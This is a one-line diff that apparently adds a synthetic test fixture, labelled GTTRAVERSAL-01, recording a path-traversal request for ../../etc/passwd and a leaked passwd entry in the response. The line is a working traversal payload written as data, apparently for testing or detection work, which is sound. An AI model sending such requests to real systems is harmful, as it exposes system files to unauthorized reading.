@@ -1,0 +1,1 @@
+GET svc-files/download?path=../../etc/passwd HTTP/1.1 -> 200 GTTRAVERSAL-01 synthetic file: root:x:0:0:root
